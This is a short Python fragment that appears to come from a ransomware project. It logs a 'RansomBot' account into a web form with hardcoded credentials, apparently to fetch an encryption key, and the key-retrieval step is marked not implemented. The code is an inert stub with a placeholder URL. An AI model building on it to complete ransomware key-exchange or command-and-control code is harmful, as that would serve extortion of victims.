def Key_Ops_HTTP():
	br = mechanize.Browser()
	br.set_handle_robots(False)
	br.addheaders = [('user-agent', '  Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3'),
	('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]

	try:
		br.open("http://www.google.com")
	except Exception as e:
		# print "[!]Critical, could not open page."
		# print "\n %s" % (e)
		pass
		
	br.form = list(br.forms())[0]
	br["username"] = "RansomBot"
	br["password"] = "prettyflypassw0rd"

	br.submit()
	# If log in was succesful retrieve key and post ID
	###---@---###
######################################---NOT IMPLEMENTED---######################################
